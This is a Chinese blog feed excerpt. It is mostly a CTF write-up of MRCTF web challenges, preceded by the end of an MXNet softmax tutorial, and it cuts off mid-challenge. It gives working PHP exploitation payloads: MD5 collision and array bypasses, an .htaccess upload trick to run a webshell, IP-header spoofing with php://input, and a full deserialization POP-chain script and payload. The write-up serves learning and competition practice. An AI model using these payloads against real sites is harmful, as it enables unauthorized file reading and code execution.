&lt;p&gt;这里因为需要使用gpu训练，重新定义了准确度函数。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;def evaluate_accuracy(data_iter, net):
    acc_sum, n = 0.0, 0
    for X, y in data_iter:
        X = X.as_in_context(ctx)
        y = y.astype('float32').as_in_context(ctx)
        acc_sum += (net(X).argmax(axis=1) == y).sum().asscalar()
        n += y.size
    return acc_sum / n
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;训练模型，一回生二回熟。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;num_epochs = 5

def train(net, train_iter, test_iter, loss, num_epochs, batch_size, trainer):
    for epoch in range(num_epochs):
        train_l_sum, train_acc_sum, n = 0.0, 0.0, 0
        for X, y in train_iter:
            with autograd.record():
                y_hat = net(X.as_in_context(ctx))
                l = loss(y_hat, y.as_in_context(ctx)).sum()
            l.backward()
            trainer.step(batch_size)
            y = y.astype('float32')
            train_l_sum += l.asscalar()
            train_acc_sum += (y_hat.argmax(axis=1) == y.as_in_context(ctx)).sum().asscalar()
            n += y.size
        test_acc = evaluate_accuracy(test_iter, net)
        print('epoch %d, loss %.4f, train acc %.3f, test acc %.3f'
              % (epoch + 1, train_l_sum / n, train_acc_sum / n, test_acc))
        
train(net, train_iter, test_iter, loss, num_epochs, batch_size, trainer)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看出来准确度还是不错的：84%，省下的测试略，见上例。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;epoch 1, loss 0.9137, train acc 0.703, test acc 0.788
epoch 2, loss 0.6413, train acc 0.784, test acc 0.820
epoch 3, loss 0.5698, train acc 0.805, test acc 0.816
epoch 4, loss 0.5274, train acc 0.822, test acc 0.833
epoch 5, loss 0.5265, train acc 0.819, test acc 0.840
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;全部代码-3&quot;&gt;全部代码&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/attachments/yuque/0/2020/html/737845/1585585178643-e4709f8d-495d-49fa-8508-f2c39e8fd5d9.html?_lake_card=%7B%22uid%22%3A%221585585176519-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fhtml%2F737845%2F1585585178643-e4709f8d-495d-49fa-8508-f2c39e8fd5d9.html%22%2C%22name%22%3A%22softmax%E5%9B%9E%E5%BD%92%E7%AE%80%E6%B4%81%E5%AE%9E%E7%8E%B0.html%22%2C%22size%22%3A283868%2C%22type%22%3A%22text%2Fhtml%22%2C%22ext%22%3A%22html%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22zTagg%22%2C%22card%22%3A%22file%22%7D&quot;&gt;softmax回归简洁实现.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;另：batch_size的选择&quot;&gt;另：Batch_size的选择&lt;/h2&gt;
&lt;p&gt;批量的选择会影响模型最终训练的准确度，采用全量训练更有助于确定梯度要优化的方向，但因为迭代次数更少实际上容易陷入极小点而出不来；另一方面采用过小的批量，如1（在线学习），又会导致模型难以收敛；所以，批量作为超参数之一，也需要合适选择来确保模型训练迭代速度更快、准确度更好，同时适当的批量引入的噪声会使模型具有更大的不确定性来逃离极小点，最终到达最小点的可能性会增加。&lt;/p&gt;
&lt;h2 id=&quot;参考资料&quot;&gt;参考资料&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/zengxiantao1994/article/details/72787849&quot;&gt;极大似然估计详解&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.jiqizhixin.com/articles/2018-07-12-5&quot;&gt;哈？你还认为似然函数跟交叉熵是一个意思呀？&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/ronny/p/4062792.html&quot;&gt;机器学习算法原理、实现与实践——机器学习的三要素&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.zhihu.com/question/32673260&quot;&gt;深度学习中的batch的大小对学习效果有何影响？&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://arxiv.org/pdf/1506.08272.pdf&quot;&gt;Asynchronous Parallel Stochastic Gradient for Nonconvex Optimization∗&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Mon, 30 Mar 2020 16:33:00 +0000</pubDate>
<dc:creator>Licsber</dc:creator>
<og:description>softmax模型、softmax运算、交叉熵损失函数、最大似然估计、Batch_size的合理选取</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/licsber/p/MXNet-4.html</dc:identifier>
</item>
<item>
<title>MRCTF 部分WriteUp - lceFIre</title>
<link>http://www.cnblogs.com/lceFIre/p/12602233.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lceFIre/p/12602233.html</guid>
<description>&lt;blockquote&gt;
&lt;p&gt;前言&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;周末做了一下北邮的CTF，这里记录一下做出来的几道题。(PS：比较菜有很多没做出来 &amp;gt;_&amp;lt; ，还是要更加努力学习啊(ง •̀o•́)ง，剩下的等大佬们出了wp后在复现一下)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;ez_bypass&quot;&gt;ez_bypass&lt;/h2&gt;
&lt;p&gt;题目源码：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;I put something in F12 for you
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&amp;amp;&amp;amp;isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) &amp;amp;&amp;amp; $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo &quot;can you think twice??&quot;;
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo &quot;You are not a real hacker!&quot;;
    }
}
else{
    die('Please input first');
}
}You got the first steponly one way to get the flag
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;一、绕过md5强类型的比较（一月的安恒祈福赛有考过）&lt;/p&gt;
&lt;p&gt;1、使用数组绕过?gg[]=1&amp;amp;id[]=2&lt;/p&gt;
&lt;p&gt;md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。&lt;/p&gt;
&lt;p&gt;2、md5全等碰撞，直接传两个具有相同md5的字符串&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;gg=m%C6%88%A3%83KhNM%91gy%7C%E2%E4Cb1%D1%FD%C41%98%96%F9%1D%7F%3E%88%2B%AA%12%81%AD%F3%E2%60%E7%C5T%EF%07g%F4%99%81h%9Dz%18%DA%7B%02%82%B6%B0%9E%0CS%DC%8D%02%B9%C0%890%97%22%C6OhQw%AA%10%D8%03b%C2%B3%B1%8F%EA%40%5C%DC%81%D9M%C5%10%E0%BA_%88%C7%CF%AB%E4%27%AF%84n4%BA%03%8A%3A%28%D8%EC%60%2F%28%80%D0%DB%A0e%3B4%19d8%E0%26%11H%F9%D0+6%E2%7B%EE%3A%A4k%A3%DF3%94%D7%A0%B1%AB%E0L%8Atv%293%8E%81%F6%17%C2%0C%D2%F4%D4%B5%DD%E0T2%C3%0B%C8%EA%19%24%0A%AD1%1A%3E%BF%7E%1F%D3D%FB%E0%91%E4a%23%88%1F%28R%0A%BFvR%BB%A4%98%91%82Y%AEl%88%EA%16%1FS%CBZ%3C%E1%B2%AF%2B%B5%40%C7%2A%60%A8%D7%D7%3D%00h%97H%F3%13%B8C%06%5B%BA%D3%F9%DCHb%7BK%AC%CE%EF%CE%C5%18C%C1z%5D%3B%F7&amp;amp;id=m%C6%88%A3%83KhNM%91gy%7C%E2%E4Cb1%D1%FD%C41%98%96%F9%1D%7F%3E%88%2B%AA%12%81%AD%F3%E2%60%E7%C5T%EF%07g%F4%99%81h%9Dz%18%DA%7B%02%82%B6%B0%9E%0CS%DC%8D%02%B9%C0%890%97%22%C6OhQw%AA%10%D8%03b%C2%B3%B1%8F%EA%40%5C%DC%81%D9M%C5%10%E0%BA_%88%C7%CF%AB%E4%27%AF%84n4%BA%03%8A%3A%28%D8%EC%60%2F%28%80%D0%DB%A0e%3B4%19d8%E0%26%11H%F9%D0+6%E2%7B%EE%3A%A4k%A3%DF3%94%D7%A0%B1%AB%E0%CC%8Atv%293%8E%81%F6%17%C2%0C%D2%F4%D4%B5%DD%E0T2%C3%0B%C8%EA%19%24%8A%AD1%1A%3E%BF%7E%1F%D3D%FB%E0%91%E4%E1%23%88%1F%28R%0A%BFvR%BB%A4%98%91%82Y%AEl%88%EA%16%1FS%CB%DA%3C%E1%B2%AF%2B%B5%40%C7%2A%60%A8%D7%D7%3D%00h%97H%F3%13%B8C%06%5B%BAS%F9%DCHb%7BK%AC%CE%EF%CE%C5%18CAz%5D%3B%F7
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;构造可以参考：[&lt;a href=&quot;https://xz.aliyun.com/t/2232&quot;&gt;https://xz.aliyun.com/t/2232&lt;/a&gt;]:&lt;/p&gt;
&lt;p&gt;二、绕过is_numeric()的检测和php的==弱比较&lt;/p&gt;
&lt;p&gt;is_numeric()的检测只要传一个非数字或数字字符串即可&lt;/p&gt;
&lt;p&gt;==弱比较可以传一个password=123456a&lt;/p&gt;
&lt;p&gt;之后可以看到flag&lt;/p&gt;
&lt;h2 id=&quot;你传你呢&quot;&gt;&lt;strong&gt;你传你🐎呢&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;把php的后缀都过滤了，试了一下.htaccess没有过滤&lt;/p&gt;
&lt;p&gt;那么先上传一个.htaccess内容如下的文件:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;FilesMatch &quot;2.jpg&quot;&amp;gt;
SetHandler application/x-httpd-php
&amp;lt;/FilesMatch&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;它会把2.jpg当作php解析&lt;/p&gt;
&lt;p&gt;然后把小马的后缀改为2.jpg上传&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330111811299-1917101351.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;蚁剑连接&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;蚁剑配置
http://2b8739dc-110e-4461-876e-a9b3860dc286.merak-ctf.site/upload/37366d578ca8a592ee9d8412e081fda1/2.jpg

密码   value
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;根目录下看的flag&lt;/p&gt;
&lt;h2 id=&quot;套娃&quot;&gt;套娃&lt;/h2&gt;
&lt;p&gt;打开查看源码可以发现&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330112151182-929845655.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;主要代码&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$query = $_SERVER['QUERY_STRING'];
//相当于获取?后面的值
 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
     //?后面的值不能有_和 %5f（%5f是_的url编码）
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' &amp;amp;&amp;amp; preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo &quot;you are going to the next ~&quot;;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;GET&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;?b.u.p.t=23333%0a
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;前面是利用php特性 . 会被转换为_&lt;/p&gt;
&lt;p&gt;后面的正则匹配是利用$无法匹配换行符号%0a来进行绕过&lt;/p&gt;
&lt;p&gt;返回FLAG is in secrettw.php，访问之后&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330112531790-694228182.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;只有127.0.0.1才行，看一下源码，发现JSPFUCk&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330112603510-1050435582.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;复制放到控制台里运行，提示post一个Merak，随便post一个值得到源码&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Flag is here~But how to get it? &amp;lt;?php 
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 


function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i&amp;lt;strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'.&quot;&amp;lt;br/&amp;gt;&quot;;
$ip = getIp();
if($ip!='127.0.0.1')
echo &quot;Sorry,you don't have permission!  Your ip is :&quot;.$ip;
if($ip === '127.0.0.1' &amp;amp;&amp;amp; file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo &quot;Your REQUEST is:&quot;.change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?&amp;gt; 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;首先伪造ip，这里使用&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;client-ip: 127.0.0.1
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后file_get_contents可以利用php://input，change只是简单的改变了一下我们传的值写个反向的方法就行&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?php
function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i&amp;lt;strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}

function change2($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i&amp;lt;strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) - $i*2 ); 
    } 
    return $re; 
}

// $flag='ZmxhZy5waHA=';
// $a=change2($flag);

$b='ZmpdYSZmXGI=';
$a=change($b);
echo $a;
?&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;最终&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;GET
?2333=php://input&amp;amp;file=ZmpdYSZmXGI=

POST
todat is a happy day
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;得到flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330113430849-540938333.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;ezpop&quot;&gt;Ezpop&lt;/h2&gt;
&lt;p&gt;这是萌新的我，第一次看懂并做出来的POP题，之前也有听说过POP，但一直没有实践，中途遇到了一个坑卡了贼久。。&lt;br/&gt;当时参考这位师傅的博客：[&lt;a href=&quot;https://www.cnblogs.com/20175211lyz/p/11560311.html&quot;&gt;https://www.cnblogs.com/20175211lyz/p/11560311.html&lt;/a&gt;]:&lt;br/&gt;但是我tcl没看懂，于是决定一步一步分析&lt;/p&gt;
&lt;p&gt;题目源码&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this-&amp;gt;append($this-&amp;gt;var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this-&amp;gt;source = $file;
        echo 'Welcome to '.$this-&amp;gt;source.&quot;&amp;lt;br&amp;gt;&quot;;
    }
    public function __toString(){
        return $this-&amp;gt;str-&amp;gt;source;
    }

    public function __wakeup(){
        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&amp;gt;source)) {
            echo &quot;hacker&quot;;
            $this-&amp;gt;source = &quot;index.php&quot;;
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this-&amp;gt;p = array();
    }

    public function __get($key){
        $function = $this-&amp;gt;p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;一些基础知识&quot;&gt;一些基础知识&lt;/h3&gt;
&lt;h4 id=&quot;序列化和反序列化&quot;&gt;序列化和反序列化&lt;/h4&gt;
&lt;p&gt;所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对&lt;/p&gt;
&lt;p&gt;象的方法，只会保存类的名字。&lt;/p&gt;
&lt;p&gt;简单来说，serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象。反序列化本身并不危险,但是如果反序列化时,传入反序列化函数的参数可以被用户控制那将会是一件非常危险的事情。&lt;/p&gt;
&lt;p&gt;类和对象的概念就不多说了&lt;/p&gt;
&lt;h4 id=&quot;几个常用魔术方法及触发条件&quot;&gt;几个常用魔术方法及触发条件&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;__construct //当一个对象创建时被调用，
__destruct //当一个对象销毁时被调用，
__toString //当一个类或对象被当作一个字符串被调用。
__wakeup() //使用unserialize时触发
__sleep() //使用serialize时触发
__get() //读取不可访问属性的值时
__set() //在给不可访问属性赋值时
__isset() //当对不可访问属性调用 isset() 或 empty() 时
__unset() //当对不可访问属性调用 unset() 时
__invoke() //当尝试以调用函数的方式调用一个对象时
__set_state()//当调用 var_export() 导出类时，此静态 方法会被调用。
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;详细参考官方手册：[&lt;a href=&quot;https://www.php.net/manual/zh/language.oop5.magic.php&quot;&gt;https://www.php.net/manual/zh/language.oop5.magic.php&lt;/a&gt;]：&lt;/p&gt;
&lt;h4 id=&quot;public、protected、private的区别&quot;&gt;public、protected、private的区别&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;public变量（公有）
直接将变量名反序列化出来
protected变量（受保护）
\x00 + * + \x00 + 变量名
private变量（私有）
\x00 + 类名 + \x00 + 变量名
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对于 \x00 和 &amp;lt;0x00&amp;gt; 他们都表示空字节，在构造的时候用 %00 来表示，如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;O:4:&quot;Test&quot;:2:{s:4:&quot;name&quot;;s:7:&quot;lceFIre&quot;;s:6:&quot;%00*%00age&quot;;i:18;}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;什么是pop？&quot;&gt;什么是POP？&lt;/h4&gt;
&lt;blockquote readability=&quot;17&quot;&gt;
&lt;p&gt;在反序列化中,我们所能控制的数据就是对象中的各个属性值,所以在PHP的反序列化有一种漏洞利用方法叫做 &quot;面向属性编程&quot; ,即 POP( Property Oriented Programming)。和二进制漏洞中常用的 ROP 技术类似。在 ROP 中我们往往需要一段初始化 gadgets 来开始我们的整个利用过程,然后继续调用其他 gadgets。在 PHP 反序列化漏洞利用技术 POP 中,对应的初始化 gadgets 就是 __wakeup() 或者是 __destruct() 方法, 在最理想的情况下能够实现漏洞利用的点就在这两个函数中,但往往我们需要从这个函数开始,逐步的跟进在这个函数中调用到的所有函数,直至找到可以利用的点为止。下面列举些在跟进其函数调用过程中需要关注一些很有价值的函数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;几个可用的pop链方法&quot;&gt;几个可用的POP链方法&lt;/h4&gt;
&lt;p&gt;命令执行：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;exec()，passthru()，popen()，system()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;文件操作：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; file_put_contents()，file_get_contents()，unlink()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果在跟进程序过程中发现这些函数就要打起精神,一旦这些函数的参数我们能够控制,就有可能出现高危漏洞.&lt;/p&gt;
&lt;p&gt;详细参考：&lt;/p&gt;
&lt;h3 id=&quot;下面分析和构造pyload&quot;&gt;下面分析和构造pyload&lt;/h3&gt;
&lt;p&gt;首先是找到入口方法也就是起点&lt;/p&gt;
&lt;p&gt;很明显只有Show里面的__wakeup会在反序列化被调用&lt;/p&gt;
&lt;p&gt;然后找一下终点，看一下最终我们利用的是哪个函数，浏览完所有方法，可以发现append方法里的include应该就是我们所需要的函数,我们可以利用它和php://filer协议来读取文件&lt;/p&gt;
&lt;p&gt;接下来从终点往前推&lt;/p&gt;
&lt;h4 id=&quot;第一步&quot;&gt;第一步&lt;/h4&gt;
&lt;p&gt;include在append方法里，那么如何调用append方法？&lt;/p&gt;
&lt;p&gt;这里我们可以看到__invoke()方法里调用了append方法，且$this-&amp;gt;var可控&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this-&amp;gt;append($this-&amp;gt;var);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;第二步&quot;&gt;第二步&lt;/h4&gt;
&lt;p&gt;如何调用__invoke()方法？&lt;/p&gt;
&lt;p&gt;我们知道：当尝试以调用函数的方式调用一个对象时，__invoke()会被调用&lt;/p&gt;
&lt;p&gt;然后在Test类的__get()方法中，$this-&amp;gt;p可控，当我们令它等于Modifier对象时，然后在return那里就会触发__invoke()方法&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;    public function __get($key){
        //获得一个类的成员变量时调用
        $function = $this-&amp;gt;p;
        //Modifier
        return $function();
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;第三步&quot;&gt;第三步&lt;/h4&gt;
&lt;p&gt;如何调用__get()方法？&lt;/p&gt;
&lt;p&gt;在读取不可访问属性的值时，__get()方法会被调用&lt;/p&gt;
&lt;p&gt;然后看到Show类的__toString()方法，这里的 $this-&amp;gt;str可控，我们可以构建一个Show对象令它的 $this-&amp;gt;str等于Test对象，这样执行return时相当于返回 Test对象的source属性，这里由于Test对象里没有source属性，所以会触发__get()方法&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public function __toString(){
        return $this-&amp;gt;str-&amp;gt;source;
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;第四步&quot;&gt;第四步&lt;/h4&gt;
&lt;p&gt;如何调用__toString()方法？&lt;/p&gt;
&lt;p&gt;当一个类或对象被当作一个字符串时，__toString会被调用。&lt;/p&gt;
&lt;p&gt;然后在我们的起点__wakeup()方法中，可以看到用preg_match对 $this-&amp;gt;source进行了匹配，这里 $this-&amp;gt;source会被当做字符串，而 $this-&amp;gt;source可控，那么可以令它等于一个Show对象，从而触发__toString方法&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public function __wakeup(){
        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&amp;gt;source)) {
            echo &quot;hacker&quot;;
            $this-&amp;gt;source = &quot;index.php&quot;;
        }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;那么完整的链就是&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;反序列化-&amp;gt;__wakeup()-&amp;gt;preg_match()-&amp;gt;__toString()-&amp;gt;__get()-&amp;gt;__invoke()-&amp;gt;append()-&amp;gt;include()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;脚本&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?php
class Modifier {
    protected $var='php://filter/read=convert.base64-encode/resource=./flag.php';
    #public $var='data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=';
}

class Show
{
    public $source;
    public $str;
}

class Test
{
    public $p;
}
$obj_Modifier = new Modifier();
$obj_Test = new Test();
$obj_Test-&amp;gt;p = $obj_Modifier;
$obj_Show1 = new Show();
$obj_Show1-&amp;gt;str = $obj_Test;
$obj_Show2 = new Show();
$obj_Show2-&amp;gt;source = $obj_Show1;
echo serialize($obj_Show2);
?&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;pyload：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;O:4:&quot;Show&quot;:2:{s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:{s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:{s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:{s:6:&quot;%00*%00var&quot;;s:59:&quot;php://filter/read=convert.base64-encode/resource=./flag.php&quot;;}}}s:3:&quot;str&quot;;N;}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;注意：var是受保护的变量所以要用 &lt;code&gt;%00*%00var&lt;/code&gt; 代替 &lt;code&gt;&amp;lt;0x00&amp;gt;*&amp;lt;0x00&amp;gt;var&lt;/code&gt; 来表示受保护的变量&lt;/p&gt;
&lt;h3 id=&quot;写在这题的最后&quot;&gt;写在这题的最后&lt;/h3&gt;
&lt;p&gt;当时做题的我是看到了源码中的 protected $var; 但是写脚本的时候忘了得到的&lt;code&gt;&quot; * $var&quot;&lt;/code&gt;要写成&lt;code&gt;&quot;%00*%00var&quot;&lt;/code&gt;,然后就以为这个行不通。。&lt;/p&gt;
&lt;p&gt;然后就想着用public弄个公有的var变量，应该也能让它调用，然后就入坑了。。。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330212455641-644658731.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我在本地用PHPstudy（当时用的是php7.2版本，这是坑点。。）和题目源码搭建了个简单的环境测试了一下生成的pyload，可以读取文件&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;O:4:&quot;Show&quot;:2:{s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:{s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:{s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:{s:3:&quot;var&quot;;s:59:&quot;php://filter/read=convert.base64-encode/resource=./flag.php&quot;;}}}s:3:&quot;str&quot;;N;}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330213021058-1443504942.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后我就高兴的（&lt;s&gt;有点sa..&lt;/s&gt;）拿着这个去打靶机，然后试了半天没点反应，然后我就以为会不会是php协议用错了（思路跑偏。。），去网上搜了半天关于include的利用。。&lt;/p&gt;
&lt;p&gt;最后绕了一大圈才想到会不会是生成pyload时用的public的问题。。。&lt;/p&gt;
&lt;p&gt;赛后我还是不理解为什么我在本地那样可以读取文件，而在靶机不行，然后就去向群里的师傅们请教&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这里感谢 Mrkaixin师傅解答了我的困惑，是PHP版本的问题。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我测试了一下 5.2~7.2 的PHP版本（以下是个人理解写的不对的地方还欢迎师傅们指出 ﹡ˆoˆ﹡ )&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在php7.2版本以前通过反序列化生成的public变量，不能重置原有的protect或private变量，php7.2的可以并且能被所在类的方法调用(但是不能在外部调用)，之后的应该也可以。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里可以看到我反序列化传入的公有变量成功被__wakeup调用，但是外部用echo输出不行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330224844914-2005937572.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;ezaudit&quot;&gt;Ezaudit&lt;/h2&gt;
&lt;p&gt;打开是个网站，浏览一下没有什么可以利用的地方，那么扫一下目录&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1765209/202003/1765209-20200330225423227-2032336273.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;login.html是登录界面&lt;/p&gt;
&lt;p&gt;www源码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?php 
header('Content-type:text/html; charset=utf-8');
error_reporting(0);
if(isset($_POST['login'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $Private_key = $_POST['Private_key'];
    if (($username == '') || ($password == '') ||($Private_key == '')) {
        // 若为空,视为未填写,提示错误,并3秒后返回登录界面
        header('refresh:2; url=login.html');
        echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;;
        exit;
}
    else if($Private_key != '*************' )
    {
        header('refresh:2; url=login.html');
